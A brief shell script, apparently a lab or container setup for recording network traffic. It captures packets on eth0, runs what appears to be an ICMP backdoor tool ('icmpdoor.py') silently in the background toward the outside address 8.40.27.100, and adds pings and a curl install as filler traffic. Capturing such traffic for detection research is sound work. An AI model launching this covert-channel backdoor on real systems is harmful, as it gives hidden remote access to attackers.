#!/bin/sh

tcpdump -i eth0 -w /tmp/strange_icmp.pcap -s 0 -U &
python icmpdoor.py -i eth0 -d 8.40.27.100 > /dev/null 2>&1 &
ping -c 50 -i 0.2 8.8.8.8
apk add curl # просто для генерации мусорного трафика :)
tail -f /dev/null